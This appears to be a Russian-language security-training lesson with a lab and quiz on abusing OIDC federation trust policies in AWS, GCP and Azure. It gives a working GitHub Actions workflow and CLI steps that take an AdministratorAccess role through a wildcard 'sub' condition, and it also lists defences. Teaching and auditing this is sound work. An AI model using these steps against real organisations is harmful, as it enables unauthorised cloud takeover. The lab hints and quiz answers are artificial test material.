---
id: cloud-oidc-federation
title: "OIDC-федерация и trust-политики: доверие, которое можно обмануть"
category: cloud
parent: cloud-cicd-secrets
difficulty: expert
order: 4
tags: [cloud, oidc, federation, trust-policy, assume-role, workload-identity]
prerequisites: [cloud-cicd-secrets, cloud-assume-role]
useful_for:
  - "Эксплуатация OIDC-доверия к облакам"
  - "Понимание федерации идентичностей"
  - "Пентест CI/CD и внешних интеграций"
estimated_minutes: 40
summary: "Как устроена OIDC-федерация в AWS/Azure/GCP, какие условия trust-политик критичны (aud/sub/iss) и как слабые проверки ведут к захвату облачных ролей. Практические пейлоады."
lab:
  kind: shell
  title: "Практика: OIDC-федерация и подделка trust"
  toolset: [core]
  workdir: /home/student/oidc
  files: [task.md, notes.md, trust-policy.json, oidc-token.txt]
  check: "grep -q 'nto{' found.txt"
  hints:
    - "В `trust-policy.json` условие `sub` слишком широкое (`repo:acme/*`) — любой репозиторий подходит."
    - "`oidc-token.txt` — base64 payload токена, выпущенного для подставного репозитория."
    - "Раскодируй: `base64 -d oidc-token.txt > token.json`, затем `grep nto token.json > found.txt`."

---
## Задача

Мы уже видели OIDC в контексте CI (`cloud-cicd-github-actions`). Теперь разберём саму **федерацию** — механизм, при котором внешняя система (CI, другой облако, SaaS) получает облачную роль без статических ключей. Задача: показать, какие условия **trust policy** (политики доверия) критичны и как одна звёздочка отдаёт роль кому угодно. Разберём на AWS-роли, которой доверяет GitHub.

## Данные: trust policy роли

**Trust policy** — это правило «кому роль разрешено принимать». Смотрим её у роли `ci-deploy`:

```
$ aws iam get-role --role-name ci-deploy --query 'Role.AssumeRolePolicyDocument'
{
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com" },
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringLike": { "token.actions.githubusercontent.com:sub": "repo:acme/*" }
    }
  }]
}
```

Читаем: роль доверяет OIDC-провайдеру GitHub Actions. Условие `sub` (subject) проверяет, **из какого репозитория** пришёл токен. Здесь стоит `repo:acme/*` — звёздочка означает «любой репозиторий организации acme».

## Пробуем в лоб: а что вообще проверяется

Чтобы принять роль, нам нужно предъявить **JWT** (JSON Web Token) — подписанный токен от GitHub. AWS проверяет в нём:

- `iss` (issuer) — кто выдал: `token.actions.githubusercontent.com`;
- `aud` (audience) — для кого: обычно `sts.amazonaws.com`;
- `sub` (subject) — конкретный контекст: `repo:acme/webapp:ref:refs/heads/main`.

Слабость — в условии `sub`. Если оно `repo:acme/*`, достаточно иметь **любой** репозиторий в организации `acme`. А если у нас есть право создать репозиторий в организации — вектор открыт.

## Приём: свой репозиторий в доверенной области

В GitHub Actions workflow может запросить OIDC-токен и обменять его на AWS-роль. Создаём в организации `acme` (или через филиал/приглашение) репозиторий `acme/evil` с workflow:

```yaml
permissions:
  id-token: write
  contents: read
jobs:
  pwn:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/ci-deploy
          aws-region: us-east-1
      - run: aws sts get-caller-identity
```

Токен от `repo:acme/evil` подходит под `repo:acme/*` — роль принимается. Мы — `ci-deploy`, хотя репозиторий наш.

Если права создавать репозиторий нет, ищем репозиторий, имя которого подходит под шаблон (например, форк `acme/*`), или организацию, чьё имя совпадает со слабым условием.

## Полный прогон: от условия sub до админской роли

1. **Читаем trust policy.** `get-role --query AssumeRolePolicyDocument` → видим `sub`.
2. **Ищем слабость.** Звёздочка, `repo:*`, отсутствие проверки `aud`.
3. **Готовим репозиторий.** Создаём репозиторий, подходящий под шаблон.
4. **Запрашиваем токен.** Workflow с `id-token: write` получает JWT от GitHub.
5. **Обмен на роль.** `configure-aws-credentials` вызывает `sts:AssumeRoleWithWebIdentity`.
6. **Проверяем.** Смотрим, что дала роль:

```
$ aws sts get-caller-identity
{ "Arn": "arn:aws:sts::123456789012:assumed-role/ci-deploy/GitHubActions" }
$ aws iam list-attached-role-policies --role-name ci-deploy
{ "AttachedPolicies": [ { "PolicyName": "AdministratorAccess" } ] }
```

Роль с `AdministratorAccess` — и мы её приняли через свой репозиторий.

## GCP Workload Identity Federation

В GCP федерация устроена через **Workload Identity Pool** и **provider**. Внешний токен (GitHub, GitLab, AWS) обменивается на токен Google через `sts.googleapis.com`. Условие задаётся в **attribute mapping** и **attribute condition** провайдера:

```
$ gcloud iam workload-identity-pools providers describe github \
    --workload-identity-pool=acme-pool --location=global \
    --format='value(attributeCondition)'
assertion.repository == 'acme/webapp' && assertion.ref == 'refs/heads/main'
```

Если условие написано как `assertion.repository_owner == 'acme'`, любой репозиторий владельца `acme` обменяет токен на impersonation сервисного аккаунта. Дальше — `gcloud auth login` с этим токеном и доступ к проекту:

```
$ gcloud auth print-access-token --impersonate-service-account=ci-sa@acme-prod.iam.gserviceaccount.com
ya29....
```

Слабости те же: слишком широкое условие, отсутствие проверки audience/issuer, доверие к чужому провайдеру.

## Слабые условия: на что смотреть

- **`sub` со звёздочкой.** `repo:acme/*` — любой репозиторий организации.
- **`sub` = `repo:acme/*:*`** — любой репозиторий и любая ветка.
- **Отсутствие `aud`.** Без проверки audience токен можно переиспользовать в другом сервисе.
- **`StringEquals` против `StringLike`.** `StringLike` допускает wildcard-паттерны; `StringEquals` — точное совпадение.
- **`ForAllValues`/`ForAnyValue` в условиях** — легко ошибиться и ослабить проверку.

У GCP аналог — **Workload Identity Federation**: там `attribute.repository`/`attribute.ref` в condition; у Azure — **federated credentials** на app registration с `subject` и `issuer`.

## Полный прогон (Azure-вариант)

У Azure app registration — federated credential с `subject` вида `repo:acme/webapp:ref:refs/heads/main`. Если `subject` указан слишком широко (`repo:acme/*`), создаём подходящий репозиторий и просим токен; обмениваем на access token Azure AD и получаем права app registration:

```
$ az login --service-principal -u $APP_ID --tenant $TENANT --federated-token $OIDC_TOKEN
$ az role assignment list --assignee $APP_ID
[ { "roleDefinitionName": "Contributor" } ]
```

## Защита и что ломает атаку

- **Точный `sub`**: `repo:acme/webapp:ref:refs/heads/main` — без звёздочек.
- **Проверка `aud`** = `sts.amazonaws.com` (или нужный сервис).
- **`StringEquals`**, а не `StringLike`, где возможно.
- **Environment + required reviewers** для ролей с широкими правами.
- **Минимум прав на роль** — не `AdministratorAccess` для CI.

## Если не сработало

- **Точный `sub`** — роль из чужого репозитория не принять.
- **Проверяется `aud`** — переиспользование токена не проходит.
- **Нет права создавать репозиторий в организации** — ищем подходящий существующий.
- **Роль узкая** — даже приняв, много не получим.

## Мини-сценарий: свой репозиторий и роль

1. **Читаем trust policy.** `get-role --role-name ci-deploy --query AssumeRolePolicyDocument` → условие `sub: repo:acme/*`.
2. **Оцениваем.** Звёздочка — любой репозиторий организации `acme`.
3. **Создаём репозиторий.** `gh repo create acme/evil --private` (если есть право) или находим подходящий существующий.
4. **Workflow.** Добавляем job с `permissions: id-token: write` и `aws-actions/configure-aws-credentials`, `role-to-assume: ci-deploy`.
5. **Обмен.** GitHub выдаёт JWT; AWS проверяет `sub` → подходит под `repo:acme/*` → роль принята.
6. **Проверка.** `aws sts get-caller-identity` → `assumed-role/ci-deploy/GitHubActions`.
7. **Эскалация.** `list-attached-role-policies --role-name ci-deploy` → `AdministratorAccess`.

Одна звёздочка в условии — и роль принимается из нашего репозитория.

## Что мы теперь знаем

1. OIDC-федерация выдаёт роль по подписанному токену без статических ключей.
2. Критичные поля: `iss`, `aud`, `sub` — их проверяют условия trust policy.
3. Звёздочка в `sub` = любой репозиторий доверенной области.
4. Создав подходящий репозиторий, можно принять роль.
5. Защита — точный `sub`, проверка `aud`, `StringEquals`, минимум прав.
6. GCP и Azure используют те же принципы: attribute condition и federated credentials.

Иными словами, OIDC убирает статические ключи, но переносит всю ответственность на точность условий доверия.

## На что смотреть дальше

- `AssumeRolePolicyDocument` ролей с Federated-провайдером.
- Условия на `sub`/`aud`: есть ли wildcard.
- `StringLike` vs `StringEquals`.
- GCP Workload Identity Pool и Azure federated credentials.
- Права роли, которую можно принять.

## Быстрая проверка

Один вызов показывает, есть ли слабость в trust policy:

```bash
aws iam get-role --role-name ci-deploy \
  --query 'Role.AssumeRolePolicyDocument.Statement[].Condition'
```

Ищите в условии `sub`/`aud` символ `*` и оператор `StringLike` — это признаки переизбыточного доверия.

## Квиз

Проверь себя.

```quiz
- question: "Что проверяет поле sub в OIDC-токене?"
  options:
    - "Конкретный контекст (репозиторий/ветку), из которого пришёл токен"
    - "Срок жизни токена"
    - "Пароль пользователя"
    - "Регион"
  answer: 0
  explanation: "sub описывает subject — например, repo:acme/webapp:ref:...".
- question: "Чем опасно условие repo:acme/* в trust policy?"
  options:
    - "Любой репозиторий организации сможет принять роль"
    - "Роль станет медленнее"
    - "Токен перестанет работать"
    - "Роль удалится"
  answer: 0
  explanation: "Звёздочка расширяет доверие на все репозитории области."
- question: "Какой оператор условия требует точного совпадения?"
  options:
    - "StringEquals"
    - "StringLike"
    - "StringNotLike"
    - "ForAnyValue"
  answer: 0
  explanation: "StringLike допускает wildcard, StringEquals — нет."
- question: "Зачем проверять aud (audience)?"
  options:
    - "Чтобы токен нельзя было переиспользовать в другом сервисе"
    - "Чтобы ускорить выдачу"
    - "Чтобы скрыть issuer"
    - "Чтобы отключить MFA"
  answer: 0
  explanation: "aud привязывает токен к целевому сервису."
- question: "Что нужно, чтобы принять AWS-роль с условием repo:acme/*?"
  options:
    - "Репозиторий в организации acme, запрашивающий OIDC-токен"
    - "Пароль root"
    - "SSH-ключ"
    - "Статический ключ AWS"
  answer: 0
  explanation: "Токен из подходящего репозитория удовлетворяет условию."
```

## Куда дальше

В следующем уроке (`cloud-gcp-secret-manager`) мы перейдём к GCP и разберём, как вытаскивать секреты из Secret Manager при слабых правах. А пока главное: OIDC надёжен ровно настолько, насколько точны условия trust policy.

## Где пригодится

- **Bug bounty:** слабые OIDC-условия в публичных организациях.
- **Red team:** принятие роли через свой репозиторий.
- **Пентест:** аудит федерации и trust policy.
- **Работа/DevSecOps:** точный `sub`, проверка `aud`, минимум прав.
- **Дальше по дереву:** `cloud-cicd-github-actions`, `cloud-assume-role`.
